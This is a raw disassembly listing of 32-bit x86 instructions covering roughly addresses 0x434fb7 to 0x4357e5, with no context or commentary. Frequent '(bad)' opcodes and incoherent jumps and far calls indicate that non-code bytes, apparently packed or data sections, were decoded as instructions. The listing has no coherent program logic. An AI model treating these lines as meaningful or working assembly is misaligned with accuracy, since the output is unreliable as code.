  434fb7:	add    bh,bh
  434fb9:	call   DWORD PTR [eax+eax*1-0x15]
  434fbd:	stos   BYTE PTR es:[edi],al
  434fbe:	sub    DWORD PTR [eax],0xff00ea62
  434fc4:	cld    
  434fc5:	add    BYTE PTR [eax],al
  434fc7:	inc    DWORD PTR [eax]
  434fc9:	call   DWORD PTR [edx+0x0]
  434fcc:	add    al,bl
  434fce:	sbb    ah,BYTE PTR [edx+0x8970a2]
  434fd4:	dec    ebp
  434fd5:	add    ah,cl
  434fd7:	add    DWORD PTR [eax],0xffffffff
  434fda:	pop    eax
  434fdb:	(bad)  
  434fdc:	mov    ebp,0x9187dc6c
  434fe1:	dec    ecx
  434fe2:	inc    DWORD PTR [eax]
  434fe4:	pop    ebp
  434fe5:	add    BYTE PTR [eax],al
  434fe7:	inc    DWORD PTR [ebx-0x2700fb7d]
  434fed:	xor    esi,DWORD PTR [esi]
  434fef:	lds    esp,FWORD PTR [ecx-0x440000f4]
  434ff5:	(bad)  
  434ff6:	(bad)  
  434ff7:	(bad)  
  434ff8:	(bad)  
  434ff9:	dec    DWORD PTR [edx-0x4634601]
  434fff:	dec    ecx
  435000:	(bad)  
  435001:	sub    al,BYTE PTR [eax]
  435003:	dec    ebp
  435005:	dec    DWORD PTR [ecx+0x13000000]
  43500b:	jmp    FWORD PTR ds:0x330e0012
  435011:	xchg   BYTE PTR [eax],al
  435013:	add    BYTE PTR [edi-0x1],dl
  435016:	dec    DWORD PTR [ecx-0x8f0100]
  43501c:	nop
  43501d:	fwait
  43501e:	mov    eax,DWORD PTR [ebx]
  435020:	ins    BYTE PTR es:[edi],dx
  435021:	lahf   
  435022:	cmp    edi,0xfffffff0
  435025:	dec    esp
  435027:	add    bh,bh
  435029:	add    BYTE PTR [ebx],ch
  43502b:	add    cl,ch
  43502d:	sub    al,0x9a
  43502f:	xor    al,dh
  435031:	mov    edx,0xff400083
  435036:	add    ah,cl
  435038:	(bad)  
  435039:	dec    DWORD PTR [ecx]
  43503b:	add    dh,cl
  43503d:	repnz inc ebx
  43503f:	out    0xd1,eax
  435041:	das    
  435042:	or     esp,0x21
  435045:	add    DWORD PTR [ebx-0x33000000],0x0
  43504c:	pushf  
  43504d:	retf   
  43504e:	add    ax,0x77
  435052:	mov    DWORD PTR [ecx-0x7600c2],ecx
  435058:	cmp    edi,0x6d
  43505b:	call   FWORD PTR [esi]
  43505d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43505e:	aas    
  43505f:	int    0x3
  435061:	inc    esi
  435062:	dec    esp
  435064:	in     al,dx
  435065:	or     DWORD PTR [ecx+0x698300ff],0xffffffff
  43506c:	xor    al,0x2e
  43506e:	xor    DWORD PTR cs:[ebx],edx
  435071:	rol    BYTE PTR [eax],1
  435073:	(bad)  
  435074:	in     eax,dx
  435075:	dec    esp
  435077:	inc    DWORD PTR [eax]
  435079:	mov    DWORD PTR ds:0x9769e889,edx
  43507f:	inc    edx
  435080:	xor    bl,BYTE PTR [ebx+eax*4]
  435083:	add    BYTE PTR [edi+0xff00],al
  435089:	int3   
  43508a:	mov    eax,0x382d9300
  43508f:	ja     0x4350b7
  435091:	inc    DWORD PTR ss:[eax]
  435094:	sub    al,0xff
  435096:	int3   
  435097:	or     esp,0xffffffff
  43509a:	mov    ds:0x9beb4300,eax
  43509f:	pop    ebp
  4350a0:	cmp    bh,dl
  4350a2:	(bad)  
  4350a3:	inc    DWORD PTR [ecx]
  4350a5:	add    DWORD PTR [eax],0x0
  4350a8:	inc    DWORD PTR [eax]
  4350aa:	push   edi
  4350ab:	adc    DWORD PTR [esi+0x124b5ba2],0xffffffdb
  4350b2:	(bad)  
  4350b3:	(bad)  
  4350b4:	mov    eax,0xffffffcc
  4350b9:	mov    DWORD PTR [ebp+0x0],edx
  4350bc:	aaa    
  4350bd:	mov    ah,0x62
  4350bf:	pop    eax
  4350c0:	out    dx,eax
  4350c1:	stos   DWORD PTR es:[edi],eax
  4350c2:	add    bh,bh
  4350c4:	mov    edi,edi
  4350c6:	inc    DWORD PTR [eax]
  4350c8:	(bad)  
  4350c9:	call   FWORD PTR [ebx+eax*4-0x11b0e5af]
  4350d0:	mov    al,0x4
  4350d2:	cmp    edi,0xffffff9b
  4350d5:	(bad)  
  4350d6:	(bad)  
  4350d7:	dec    esp
  4350d9:	mov    DWORD PTR ds:0xa04e9cff,ecx
  4350df:	pop    es
  4350e0:	scas   eax,DWORD PTR es:[edi]
  4350e1:	adc    al,0xff
  4350e3:	inc    DWORD PTR [edi]
  4350e5:	add    ah,cl
  4350e7:	(bad)  
  4350e8:	dec    esp
  4350ea:	ins    BYTE PTR es:[edi],dx
  4350eb:	dec    esp
  4350ed:	dec    edx
  4350ee:	cs stos BYTE PTR es:[edi],al
  4350f0:	or     BYTE PTR [ecx],al
  4350f2:	cmp    edi,0x36
  4350f5:	add    bh,bh
  4350f7:	add    DWORD PTR [ebx-0x15338900],0xffffffca
  4350fe:	shl    DWORD PTR [esi],cl
  435100:	or     BYTE PTR [edx-0x7d],dl
  435103:	inc    DWORD PTR [edx-0x1]
  435106:	mov    DWORD PTR [eax],eax
  435108:	mov    DWORD PTR [eax],eax
  43510a:	inc    eax
  43510b:	int3   
  43510c:	jp     0x435163
  43510e:	mov    WORD PTR [ebp-0x5c],cs
  435111:	push   0xffffff83
  435113:	add    ah,ch
  435115:	(bad)  
  435116:	(bad)  
  435117:	(bad)  
  435118:	dec    esp
  43511a:	xchg   ecx,eax
  43511b:	add    BYTE PTR [edx-0x4c],ch
  43511e:	push   ecx
  43511f:	fiadd  WORD PTR [ebx+0x5c00837f]
  435125:	add    bh,bh
  435127:	inc    DWORD PTR [ebx-0x40ffa734]
  43512d:	pop    eax
  43512e:	jns    0x4350f7
  435130:	das    
  435131:	and    edi,edi
  435133:	sub    DWORD PTR [esi],0xffffffff
  435136:	(bad)  
  435137:	dec    esp
  435139:	add    BYTE PTR [edx+0x321e2789],dl
  43513f:	repnz or DWORD PTR [edi+0x41ccff],ebp
  435146:	mov    edi,edi
  435148:	(bad)  
  435149:	jmp    DWORD PTR [ecx-0xe2d4534]
  43514f:	stos   DWORD PTR es:[edi],eax
  435150:	push   edx
  435151:	adc    edi,edi
  435153:	push   DWORD PTR [edx-0x76007634]
  435159:	sbb    DWORD PTR [edi+edi*8],0xffffffdb
  43515d:	paddd  mm3,mm0
  435160:	jle    0x4350ff
  435162:	cmp    edi,0x73
  435165:	add    BYTE PTR [ebx-0x49ff007d],al
  43516b:	call   eax
  43516d:	or     ecx,DWORD PTR [ebx+0x3e52f4]
  435173:	add    BYTE PTR [eax],dl
  435175:	inc    DWORD PTR [eax]
  435177:	(bad)  
  435178:	(bad)  
  435179:	push   DWORD PTR [ebp-0xb189e00]
  43517f:	or     eax,0xffff5312
  435184:	inc    edx
  435185:	cmp    edi,0xffffffff
  435188:	add    bh,bh
  43518a:	leave  
  43518b:	add    BYTE PTR [ebp+0x3e],ch
  43518e:	call   0xffb0c2fb
  435193:	mov    ecx,edi
  435195:	int3   
  435196:	add    BYTE PTR [ecx+0x5100ff],cl
  43519c:	mov    al,0x3b
  43519e:	sti    
  43519f:	imul   BYTE PTR [edx]
  4351a1:	dec    eax
  4351a2:	cmp    edi,0x1f
  4351a5:	mov    DWORD PTR [eax],eax
  4351a7:	inc    DWORD PTR [eax]
  4351a9:	inc    DWORD PTR [edi-0x1]
  4351ac:	leave  
  4351ad:	dec    ecx
  4351ae:	xchg   ebx,eax
  4351af:	xchg   edi,eax
  4351b0:	xor    al,0x10
  4351b2:	(bad)  
  4351b3:	dec    ecx
  4351b5:	inc    DWORD PTR [eax]
  4351b7:	add    bh,bh
  4351b9:	add    cl,bh
  4351bb:	adc    eax,0xffffffa8
  4351be:	add    edx,DWORD PTR [ebx+0x1a]
  4351c1:	sbb    cl,ah
  4351c3:	xor    DWORD PTR [ecx+0x0],0xffffffff
  4351c7:	inc    DWORD PTR [eax]
  4351c9:	add    BYTE PTR [ebp+0x7b76dff],bh
  4351cf:	aaa    
  4351d0:	pop    ecx
  4351d1:	les    eax,FWORD PTR [eax]
  4351d3:	int3   
  4351d4:	rol    DWORD PTR [eax],0x83
  4351d7:	add    bh,bh
  4351d9:	call   FWORD PTR ds:0x4cf55a00
  4351df:	and    DWORD PTR [ecx],eax
  4351e1:	xor    bh,bh
  4351e3:	cmp    DWORD PTR [esi],0xffffffff
  4351e6:	(bad)  
  4351e7:	(bad)  
  4351e8:	inc    DWORD PTR [eax]
  4351ea:	sub    bh,bh
  4351ec:	fiadd  DWORD PTR [edi+0x20222a33]
  4351f2:	inc    DWORD PTR [eax]
  4351f4:	ins    DWORD PTR es:[edi],dx
  4351f5:	add    BYTE PTR [ecx-0x34007700],cl
  4351fb:	xor    DWORD PTR [ecx+0x29],0xffffffdc
  4351ff:	stos   BYTE PTR es:[edi],al
  435200:	(bad)  
  435201:	std    
  435202:	(bad)  
  435203:	inc    DWORD PTR [edx+0x0]
  435206:	int3   
  435207:	add    bh,bh
  435209:	dec    DWORD PTR [edi+0x3d61fff]
  43520f:	push   edi
  435210:	inc    DWORD PTR [ebx+eax*4-0xff5c01]
  435217:	mov    edi,edi
  435219:	add    BYTE PTR [ebp+0x52d725ff],bh
  43521f:	dec    ecx
  435220:	pop    ss
  435221:	loope  0x435222
  435223:	or     DWORD PTR [esi-0x1],0xffffffff
  435227:	cmp    edi,0xffffffff
  43522a:	jge    0x43522b
  43522c:	cmovp  ecx,DWORD PTR [eax-0x860660]
  435233:	call   edi
  435235:	add    bh,bh
  435237:	add    bh,bh
  435239:	add    BYTE PTR [ebx+eax*4+0x1a12295e],bh
  435240:	cs xchg esi,eax
  435242:	(bad)  
  435243:	inc    DWORD PTR [edx-0x1]
  435246:	int3   
  435247:	(bad)  
  435248:	(bad)  
  435249:	jmp    FWORD PTR [ebx]
  43524b:	add    BYTE PTR [ebx+0x19],al
  43524e:	xor    edx,DWORD PTR [ebx-0x1e94]
  435254:	lods   al,BYTE PTR ds:[esi]
  435255:	add    bh,bh
  435257:	add    DWORD PTR [ebx-0x13761500],0x3c
  43525e:	gs std 
  435260:	stos   BYTE PTR es:[edi],al
  435261:	nop
  435262:	inc    DWORD PTR [eax]
  435264:	pop    ss
  435265:	inc    DWORD PTR [eax]
  435267:	inc    DWORD PTR [eax]
  435269:	call   DWORD PTR ds:0x78706cff
  43526f:	cmp    edx,DWORD PTR [ebp-0x51]
  435272:	add    DWORD PTR [eax],0x14
  435275:	cmp    edi,0xffffff83
  435278:	add    bh,bh
  43527a:	mov    es,WORD PTR [eax]
  43527c:	sbb    eax,0xc000bf88
  435281:	add    BYTE PTR [ebx-0x7c00b400],0xff
  435288:	cmp    edi,0x29
  43528b:	add    DWORD PTR [ebp+0x69f5a4a1],0xffffffd4
  435292:	cmp    edi,0xffffffaa
  435295:	add    BYTE PTR [ebx-0x147cff34],al
  43529b:	int3   
  43529c:	in     al,0xff
  43529e:	ret    
  43529f:	mov    eax,0xffff5747
  4352a4:	clc    
  4352a5:	dec    esp
  4352a7:	(bad)  
  4352a8:	inc    DWORD PTR [ebx-0x6a6e00ff]
  4352ae:	fisttp QWORD PTR [edi-0x36]
  4352b1:	jecxz  0x435236
  4352b3:	jmp    FWORD PTR [ebx-0xff0100]
  4352b9:	add    BYTE PTR [ebp-0x1],dh
  4352bc:	scas   al,BYTE PTR es:[edi]
  4352bd:	or     DWORD PTR ds:0x531106,ebp
  4352c3:	add    edx,0xffffffff
  4352c6:	or     DWORD PTR [ecx+0xf8ffff],0x26
  4352cd:	mov    esp,esi
  4352cf:	or     eax,0x8343fe
  4352d4:	xchg   edx,eax
  4352d5:	cmp    edi,0x0
  4352d8:	add    BYTE PTR [ecx-0x57bbffdc],cl
  4352de:	xchg   ebx,eax
  4352df:	fdivr  QWORD PTR [ebx-0xa76ffc1]
  4352e5:	cmp    edi,0x0
  4352e8:	(bad)  
  4352e9:	jmp    FWORD PTR [edx-0x64197934]
  4352ef:	idiv   BYTE PTR [edx+0x1e]
  4352f2:	add    BYTE PTR [eax],al
  4352f4:	inc    edi
  4352f5:	(bad)  
  4352f6:	inc    DWORD PTR [eax]
  4352f8:	inc    DWORD PTR [eax]
  4352fa:	int3   
  4352fb:	add    BYTE PTR [ecx+0x6dc6d7b1],dh
  435301:	xchg   BYTE PTR [ebx-0x7cff7b7d],al
  435307:	(bad)  
  435308:	(bad)  
  435309:	call   DWORD PTR [ebx-0x1]
  43530c:	mov    edi,0xcba93837
  435311:	out    dx,al
  435312:	cmp    edi,0xfffffff5
  435315:	(bad)  
  435316:	inc    DWORD PTR [eax]
  435318:	inc    DWORD PTR [ebx+0x36fa00d6]
  43531e:	pop    ebx
  43531f:	imul   ebx,DWORD PTR [ebx+0x4],0x1dff00
  435326:	(bad)  
  435327:	dec    esp
  435329:	push   eax
  43532b:	add    bh,bh
  43532d:	int3   
  43532e:	inc    DWORD PTR [ebx-0x115d01]
  435334:	into   
  435335:	int3   
  435336:	jmp    FWORD PTR [eax+eax*1]
  435339:	dec    edi
  43533a:	ja     0x43533c
  43533c:	loopne 0x43533d
  43533e:	inc    DWORD PTR [ebp-0xd4ce7d]
  435344:	adc    bh,bh
  435346:	jmp    DWORD PTR [eax-0xce6d01]
  43534c:	jbe    0x43534d
  43534e:	inc    DWORD PTR [ecx+0x877ecc]
  435354:	stos   DWORD PTR es:[edi],eax
  435355:	mov    DWORD PTR [eax],eax
  435357:	lahf   
  435358:	or     DWORD PTR [edx+0xe],0xffffffff
  43535c:	pop    ds
  43535d:	dec    esp
  43535f:	xchg   edx,eax
  435360:	add    BYTE PTR [edi+0x3c],dl
  435363:	add    bl,ch
  435365:	mov    DWORD PTR [eax],eax
  435367:	pusha  
  435368:	push   ebp
  43536a:	out    dx,eax
  43536b:	add    bl,bl
  43536d:	inc    DWORD PTR [ebx+0x7bceff4e]
  435373:	int3   
  435374:	pop    ecx
  435375:	(bad)  
  435376:	call   FWORD PTR [eax-0x1]
  435379:	mov    WORD PTR [eax-0x1],cs
  43537c:	jno    0x43537d
  43537e:	add    BYTE PTR [edi],bl
  435380:	push   DWORD PTR [esi+0x4b]
  435383:	xor    DWORD PTR [ebx],0xffffffff
  435386:	sbb    DWORD PTR [eax+0xf9acff],0xffffffaa
  43538d:	cmp    edi,0xffffffd0
  435390:	add    BYTE PTR [edi],bh
  435392:	adc    DWORD PTR [ebx+0x570000b7],eax
  435398:	add    BYTE PTR [esi+esi*4],dl
  43539b:	add    ch,dl
  43539d:	add    bh,bh
  43539f:	cmp    eax,0xff938d00
  4353a4:	mov    bh,0x0
  4353a6:	dec    DWORD PTR [eax-0x7649d97d]
  4353ac:	lods   al,BYTE PTR ds:[esi]
  4353ad:	inc    DWORD PTR [eax]
  4353af:	push   ss
  4353b0:	dec    DWORD PTR [ebx+0x30]
  4353b3:	dec    edi
  4353b5:	inc    DWORD PTR [eax]
  4353b7:	pop    ss
  4353b8:	inc    DWORD PTR [esi-0x3e00e5]
  4353be:	mov    DWORD PTR [esi],eax
  4353c0:	push   DWORD PTR [ecx]
  4353c2:	rol    BYTE PTR [ebx-0x11007c43],0x83
  4353c9:	retf   0xffd1
  4353cc:	mov    ds:0x1cff00,al
  4353d1:	(bad)  
  4353d3:	adc    DWORD PTR [ebp+0x0],0xffffffff
  4353d7:	adc    eax,0x337ff
  4353dc:	sub    edi,edi
  4353de:	add    BYTE PTR [edi+edi*8+0x2c],ch
  4353e2:	cmp    bh,bh
  4353e4:	xchg   ecx,eax
  4353e5:	add    DWORD PTR [ebx-0x2cba3311],0xffffff83
  4353ec:	inc    ecx
  4353ed:	inc    DWORD PTR [eax]
  4353ef:	loope  0x43537a
  4353f1:	xchg   esi,ebp
  4353f3:	sub    DWORD PTR [edx+0xb200ff],0x2e
  4353fa:	pusha  
  4353fb:	push   DWORD PTR [eax+eax*1-0xbff8500]
  435402:	push   0xffffffff
  435404:	nop
  435405:	add    bh,bh
  435407:	push   esp
  435408:	call   FWORD PTR [edx-0x5c]
  43540b:	(bad)  
  43540c:	mov    esp,0xff06ffff
  435411:	add    al,0xb1
  435413:	add    BYTE PTR [esi-0x1],dh
  435416:	jmp    DWORD PTR [ebx]
  435418:	inc    DWORD PTR [eax+0x69ffeb]
  43541e:	jmp    DWORD PTR [ebx-0x1]
  435421:	aaa    
  435422:	aad    0x83
  435424:	pop    edx
  435425:	add    BYTE PTR [eax],al
  435427:	cmp    BYTE PTR [eax],al
  435429:	inc    edx
  43542a:	cld    
  43542b:	sub    DWORD PTR [edi],0xffffffff
  43542e:	(bad)  
  43542f:	cmp    DWORD PTR [eax],eax
  435431:	sbb    eax,0x83e08333
  435436:	xor    DWORD PTR [edi+0x0],0x7d
  43543a:	jge    0x43543c
  43543c:	jb     0x43543d
  43543e:	jmp    ecx
  435440:	mov    DWORD PTR [esp+ebp*8-0x76fa7d],ebp
  435447:	mov    bl,0x89
  435449:	cli    
  43544a:	int3   
  43544b:	push   DWORD PTR [edi-0x7d]
  43544e:	dec    ebx
  435450:	int3   
  435451:	(bad)  
  435452:	rol    DWORD PTR [ebx-0x56000057],1
  435458:	jmp    FWORD PTR [eax+ebp*2-0xff737d]
  43545f:	mov    ah,0x0
  435461:	and    ch,BYTE PTR [edi+edi*8+0x30]
  435465:	int3   
  435466:	dec    esp
  435468:	jmp    DWORD PTR [ecx+eiz*4+0x0]
  43546c:	test   bh,bh
  43546e:	jmp    DWORD PTR [esp+ecx*8-0x277c0518]
  435475:	mov    esp,ecx
  435477:	sub    BYTE PTR [ebx-0x2337970],al
  43547d:	add    bh,bh
  43547f:	cdq    
  435480:	mov    DWORD PTR [ecx-0x5c],ebx
  435483:	call   edx
  435485:	mov    DWORD PTR [ebx+0x2a60ff48],eax
  43548b:	add    DWORD PTR [edi+edi*8],0xffffffff
  43548f:	xchg   esp,eax
  435490:	inc    DWORD PTR [edx-0x51]
  435493:	dec    ecx
  435495:	add    DWORD PTR [eax],0xffffffd7
  435498:	adc    DWORD PTR [ecx],0xffffff81
  43549b:	jmp    DWORD PTR [ebx+0x79ff83]
  4354a1:	in     eax,0xab
  4354a3:	add    BYTE PTR [edi+edi*8-0x4d334601],ah
  4354aa:	xchg   esi,eax
  4354ab:	add    BYTE PTR [ebx-0x460001],ah
  4354b1:	or     BYTE PTR [edi],ch
  4354b3:	inc    DWORD PTR [edi-0x1]
  4354b6:	add    eax,0xffffffff
  4354b9:	mov    ch,BYTE PTR [esi+0x0]
  4354bc:	pop    esi
  4354bd:	inc    DWORD PTR [eax]
  4354bf:	fimul  DWORD PTR [ecx+0x45003468]
  4354c5:	inc    DWORD PTR [ebx+0x1d34ffb6]
  4354cb:	jmp    esi
  4354cd:	inc    DWORD PTR [eax]
  4354cf:	pop    es
  4354d0:	jmp    FWORD PTR [ebp-0x71]
  4354d3:	add    bl,al
  4354d5:	(bad)  
  4354d6:	call   FWORD PTR [ebp-0x1]
  4354d9:	push   ebx
  4354da:	clc    
  4354db:	add    BYTE PTR [edi],bl
  4354dd:	(bad)  
  4354de:	(bad)  
  4354df:	in     al,dx
  4354e0:	call   FWORD PTR [edi]
  4354e2:	adc    eax,0x897d00
  4354e7:	and    BYTE PTR [ebx-0x51009b26],al
  4354ed:	(bad)  
  4354ee:	dec    ecx
  4354f0:	inc    DWORD PTR [ecx]
  4354f2:	loop   0x4354c0
  4354f4:	out    dx,al
  4354f5:	inc    DWORD PTR [eax]
  4354f7:	mov    eax,0x2a700
  4354fc:	addr16 dec esp
  4354ff:	cmp    bh,bh
  435501:	mov    ecx,0x2d835f
  435506:	dec    DWORD PTR [ecx+0xa574ff]
  43550c:	jge    0x43550d
  43550e:	add    BYTE PTR ds:0xff4459ff,dl
  435514:	xor    al,0xff
  435516:	add    ah,dh
  435518:	call   DWORD PTR [edx]
  43551a:	xchg   ecx,eax
  43551b:	add    BYTE PTR [edx],bl
  43551d:	inc    DWORD PTR [ebx+0x6ad8ffde]
  435523:	(bad)  
  435524:	jp     0x435525
  435526:	add    BYTE PTR [edi],bh
  435528:	int3   
  435529:	mov    ch,0x49
  43552b:	and    DWORD PTR [edi+0xed83ff],0x5e
  435532:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435533:	mov    DWORD PTR [edx],ebp
  435535:	int3   
  435536:	call   FWORD PTR [edi-0x1e5601]
  43553c:	or     esp,0x97008500
  435542:	xchg   ecx,eax
  435543:	jmp    DWORD PTR [edi+edi*8]
  435546:	(bad)  
  435547:	inc    BYTE PTR [eax]
  435549:	dec    ebx
  43554a:	js     0x43554c
  43554c:	popa   
  43554d:	dec    esp
  43554f:	repnz (bad) 
  435551:	jp     0x43558b
  435553:	dec    ebp
  435555:	cmp    edi,0x5c
  435558:	jmp    DWORD PTR [eax+0x1f]
  43555b:	inc    DWORD PTR [ebx-0x34]
  43555e:	(bad)  
  43555f:	mov    edx,0xdc32ff
  435564:	test   edi,edi
  435566:	add    BYTE PTR [edx-0x99f801],bl
  43556c:	fadd   QWORD PTR [ebx+0x2e830000]
  435572:	cmc    
  435573:	call   DWORD PTR [ecx-0x7669ff77]
  435579:	(bad)  
  43557a:	jmp    0xffc6d57f
  43557f:	push   ebx
  435580:	(bad)  
  435581:	fiadd  WORD PTR [ebp+0x83dbff]
  435587:	push   esp
  435588:	(bad)  
  435589:	mov    edi,0xfcffdf
  43558e:	add    BYTE PTR [ecx-0x7d],ah
  435591:	adc    al,BYTE PTR [edi+edi*8-0x40]
  435595:	(bad)  
  435596:	dec    DWORD PTR [ebx]
  435598:	and    DWORD PTR [edi+0x7b],0xffffffff
  43559c:	leave  
  43559d:	add    bh,bh
  43559f:	jle    0x43556d
  4355a1:	fistp  QWORD PTR [edi-0x1]
  4355a4:	inc    BYTE PTR [ebx+0x800ecff]
  4355aa:	repnz add BYTE PTR [edx-0x1f3400],al
  4355b1:	xchg   edi,eax
  4355b2:	sahf   
  4355b3:	jmp    DWORD PTR [eax+eax*1]
  4355b6:	add    BYTE PTR [edx],ah
  4355b8:	add    BYTE PTR [ebx+0x1189c0],al
  4355be:	xor    DWORD PTR [edi],0xffffffff
  4355c1:	sub    ch,BYTE PTR [edi-0x1]
  4355c4:	out    0x0,eax
  4355c6:	(bad)  
  4355c7:	clc    
  4355c8:	and    DWORD PTR [eax+0x72],0xffffff83
  4355cc:	mov    eax,DWORD PTR [eax]
  4355ce:	push   DWORD PTR [ecx-0x1]
  4355d1:	cdq    
  4355d2:	pop    ebp
  4355d3:	and    DWORD PTR [eax+0x0],0x0
  4355d7:	and    BYTE PTR [ecx-0xaffb378],cl
  4355dd:	cmp    edi,0xffffffe6
  4355e0:	push   DWORD PTR [esi-0x7c3c00aa]
  4355e6:	mov    ecx,eax
  4355e8:	call   FWORD PTR [eax-0x3f]
  4355eb:	add    BYTE PTR [edi+0x0],bl
  4355ee:	dec    DWORD PTR [esi-0x373001]
  4355f4:	sbb    al,0x83
  4355f6:	add    BYTE PTR [ebp-0x1],dh
  4355f9:	popf   
  4355fa:	cwde   
  4355fb:	push   edx
  4355fd:	mov    edi,edi
  4355ff:	mov    dl,0xff
  435601:	fiadd  WORD PTR [edx]
  435603:	add    BYTE PTR [ebx],ch
  435605:	add    BYTE PTR [ebx+0x4e7300ad],al
  43560b:	adc    DWORD PTR [ecx-0xe8007d],0xffffffbf
  435612:	xchg   edx,eax
  435613:	call   FWORD PTR [edx-0x33cb3301]
  435619:	dec    edx
  43561a:	mov    DWORD PTR ss:[ebx+eax*4],ecx
  43561e:	add    bl,bl
  435620:	jmp    DWORD PTR [edx]
  435622:	xchg   esi,eax
  435623:	call   DWORD PTR [eax]
  435625:	add    BYTE PTR [eax],al
  435627:	and    bh,bh
  435629:	out    dx,al
  43562a:	jmp    FWORD PTR ds:[edi]
  43562d:	(bad)  
  43562e:	call   DWORD PTR [edx-0x76c93d01]
  435634:	push   eax
  435635:	(bad)  
  435636:	push   DWORD PTR [esi]
  435638:	xor    DWORD PTR [ebx-0x77],0x0
  43563c:	adc    bh,bh
  43563e:	add    BYTE PTR [edx-0x457277],ah
  435644:	sbb    eax,0x5ffff
  435649:	adc    ebx,ebx
  43564b:	add    BYTE PTR [ebx-0x77],ah
  43564e:	call   FWORD PTR [ebp-0x266100]
  435654:	and    eax,0xfffbffff
  435659:	xor    ebx,ebx
  43565b:	add    BYTE PTR [edi],dl
  43565d:	dec    esp
  43565f:	pop    ss
  435660:	add    ch,dh
  435662:	xchg   BYTE PTR [ebx-0x53ff7cd5],al
  435668:	call   FWORD PTR [ecx]
  43566a:	stos   BYTE PTR es:[edi],al
  43566b:	call   DWORD PTR [ebx]
  43566d:	inc    DWORD PTR [ebx+0x5e6bffd1]
  435673:	dec    DWORD PTR [ecx-0x1]
  435676:	inc    DWORD PTR [eax-0x7cea5800]
  43567c:	popf   
  43567d:	(bad)  
  43567e:	jmp    DWORD PTR [ebx+eax*4+0x6a00c37c]
  435685:	mov    edi,edi
  435687:	call   0x8343988b
  43568c:	repz add DWORD PTR [eax],0xffffff9e
  435690:	(bad)  
  435691:	cmp    al,0x69
  435693:	jmp    DWORD PTR [ebx+eax*4]
  435696:	add    BYTE PTR ds:0xffdaafff,ch
  43569c:	popa   
  43569d:	int3   
  43569e:	inc    ebp
  4356a0:	add    BYTE PTR [esi+ebx*8-0x7d],dh
  4356a4:	xchg   ebp,eax
  4356a5:	add    bh,bh
  4356a7:	imul   edi,edi,0xee003bae
  4356ad:	(bad)  
  4356ae:	(bad)  
  4356af:	stc    
  4356b0:	cmp    DWORD PTR [esi],0x71
  4356b3:	sub    DWORD PTR [edi],0xffffffff
  4356b6:	add    BYTE PTR [esi-0x3302877d],dh
  4356bc:	out    0xff,al
  4356be:	jmp    DWORD PTR [esi-0xe2f400]
  4356c4:	fwait
  4356c5:	int3   
  4356c6:	dec    DWORD PTR [edx-0x7c760077]
  4356cc:	lods   eax,DWORD PTR ds:[esi]
  4356cd:	(bad)  
  4356ce:	inc    DWORD PTR [edi]
  4356d0:	call   FWORD PTR [esi-0x76de76b6]
  4356d6:	(bad)  
  4356d7:	in     eax,dx
  4356d8:	(bad)  
  4356d9:	dec    BYTE PTR [edi+edi*8]
  4356dc:	mov    ebx,0xffb68300
  4356e1:	mov    bh,0xe2
  4356e3:	(bad)  
  4356e4:	fiadd  WORD PTR [eax]
  4356e6:	jmp    FWORD PTR [edx+0x0]
  4356e9:	ds xor al,0xff
  4356ec:	cmp    al,0xff
  4356ee:	jmp    FWORD PTR [esi+0xeb5189]
  4356f4:	cmp    bh,bh
  4356f6:	add    BYTE PTR [eax+eax*1-0x3dff061f],ah
  4356fd:	inc    DWORD PTR [eax]
  4356ff:	push   ss
  435700:	jmp    DWORD PTR [ebp+0x3ff34]
  435706:	add    BYTE PTR [edi-0x1],al
  435709:	in     eax,dx
  43570a:	mov    eax,0xff0085ff
  43570f:	jns    0x435694
  435711:	ret    0x896c
  435714:	sub    al,0xff
  435716:	jmp    FWORD PTR [edi+0x0]
  435719:	retf   0x87
  43571c:	cmp    eax,0xff9c8900
  435721:	xchg   esi,eax
  435722:	repnz inc DWORD PTR [eax-0xcb7601]
  435729:	mov    ecx,0xff31ff1f
  43572e:	add    BYTE PTR [eax+0xfa1eff],ah
  435734:	inc    edx
  435735:	or     DWORD PTR [ecx+0x1c5cffd5],0xffffffff
  43573c:	mov    bh,0xcc
  43573e:	push   DWORD PTR [ebp-0x34]
  435741:	out    0x6b,al
  435743:	int3   
  435744:	mov    cl,0x0
  435746:	jmp    DWORD PTR [esi]
  435748:	call   ebp
  43574a:	test   BYTE PTR [eax],al
  43574c:	imul   edi,edi,0x2839d83
  435752:	mov    bh,0xff
  435754:	sbb    esp,ecx
  435756:	call   DWORD PTR [edi+0x0]
  435759:	cmc    
  43575a:	mov    ah,0x0
  43575c:	inc    DWORD PTR fs:[ebx+0x6b0006b]
  435763:	add    BYTE PTR [edx],ah
  435765:	add    bh,bh
  435767:	test   bh,bh
  435769:	sbb    DWORD PTR [ecx],esi
  43576b:	call   FWORD PTR [ecx-0x76603400]
  435771:	test   DWORD PTR [ecx-0x1],ebx
  435774:	fiadd  DWORD PTR [eax]
  435776:	add    BYTE PTR [ebx-0x1],bh
  435779:	mov    ds:0x83a58366,eax
  43577e:	mov    edi,edx
  435780:	push   DWORD PTR [ebp-0x63]
  435783:	(bad)  
  435784:	ds (bad) 
  435786:	call   DWORD PTR [edi-0x1]
  435789:	jge    0x435776
  43578b:	add    BYTE PTR [ecx-0xf2ff34],al
  435791:	xor    DWORD PTR [eax+0xcff],ebp
  435797:	jl     0x435798
  435799:	sbb    DWORD PTR [edi-0x7ceb01],edx
  43579f:	push   esi
  4357a0:	int3   
  4357a1:	inc    ebx
  4357a2:	ret    
  4357a3:	(bad)  
  4357a4:	mov    ecx,0xfff2ffff
  4357a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4357aa:	jecxz  0x4357ab
  4357ac:	lahf   
  4357ad:	(bad)  
  4357ae:	dec    DWORD PTR [ecx+0x374100]
  4357b4:	mov    ebp,0xff38ff00
  4357b9:	dec    esp
  4357ba:	pop    ebp
  4357bb:	add    BYTE PTR [esp+ecx*8-0x1],dl
  4357bf:	cmp    al,0x0
  4357c1:	pop    esp
  4357c2:	les    ecx,FWORD PTR [ecx+0x2100008d]
  4357c8:	dec    esi
  4357ca:	test   DWORD PTR [eax],eax
  4357cc:	inc    DWORD PTR fs:[eax]
  4357cf:	xchg   ebp,eax
  4357d0:	dec    DWORD PTR [edx]
  4357d2:	dec    ecx
  4357d3:	xor    DWORD PTR [ebx+eax*4-0x34],0x61
  4357d8:	inc    DWORD PTR ds:0xcc7cff2e
  4357de:	add    BYTE PTR [edx-0x339c6e01],al
  4357e4:	pop    edi
  4357e5:	(bad)  
